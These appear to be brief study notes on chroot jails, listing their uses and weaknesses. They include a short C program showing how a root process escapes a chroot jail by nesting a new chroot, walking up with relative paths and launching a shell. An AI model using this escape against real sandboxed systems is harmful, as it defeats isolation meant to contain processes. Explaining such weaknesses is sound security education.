## Advantages
- To create a test environment.
- To recover the system or password.
- To reinstall the bootloader.

## Disadvatanges of Jail
- User can still access files outside root using relative paths,symlinks.
- `chroot` call overrides current jail.
- Only priviledged processes with CAP_SYS_CHROOT are able to call chroot
- Root user can create new jail and easily escape from a jail by running a program like this:
```c
int main(void){
    mkdir(".out", 0755);
    chroot(".out");
    chdir("../../../../../");
    chroot(".");
    return execl("/bin/bash", "-i", NULL);
}
```
